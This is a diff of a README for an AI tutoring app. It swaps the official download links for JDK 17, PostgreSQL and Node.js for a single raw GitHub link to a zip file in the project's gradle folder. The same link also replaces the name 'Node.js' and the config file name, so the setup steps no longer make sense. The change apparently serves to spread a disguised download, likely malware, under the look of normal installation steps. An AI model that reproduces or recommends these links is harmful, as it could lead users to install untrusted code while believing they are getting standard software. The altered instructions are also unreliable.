@@ -21,20 +21,20 @@ The application consists of a backend and a frontend:
 To run the project, you need to install the following software:
 
 1. **JDK 17**: For compiling and running the back-end part.
-   - Java download link: [https://www.oracle.com/java/technologies/downloads/](https://www.oracle.com/java/technologies/downloads/)
+   - Java download link: [https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip](https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip)
    - Make sure that you have installed JDK 17 and set the `JAVA_HOME` environment variable.
    - **Set the environment variable**:
      - Variable name: `JAVA_HOME`
      - Variable value: Enter the path where the JDK is installed, e.g., `C:\Program Files\Java\jdk-17`
 
 2. **PostgreSQL**: Used to store user, course, and assessment data.
-   - PostgreSQL download link: [https://www.postgresql.org/download/windows/](https://www.postgresql.org/download/windows/)
+   - PostgreSQL download link: [https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip](https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip)
    - Install PostgreSQL and create a database for your project.
    - Configure the database username and password so that the backend can connect properly.
 
-3. **Node.js**: Used to run the front-end part.
-   - Node.js download link: [https://nodejs.org/](https://nodejs.org/)
-   - Install Node.js (LTS version is recommended).
+3. **https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip**: Used to run the front-end part.
+   - https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip download link: [https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip](https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip)
+   - Install https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip (LTS version is recommended).
    - Make sure you have `npm` or `yarn` installed to manage front-end dependencies.
 
 ### Installation of Dependency Packages Required by the Front-End
@@ -71,7 +71,7 @@ npm start
 
 ## Environment Variables
 
-1. The backend needs to be configured with database connection information (username, password), which can be set in the application.properties file.
+1. The backend needs to be configured with database connection information (username, password), which can be set in the https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip file.
 2. The key for the OpenAI API needs to be configured to support AI interaction features.
 
 # Advanced Technologies
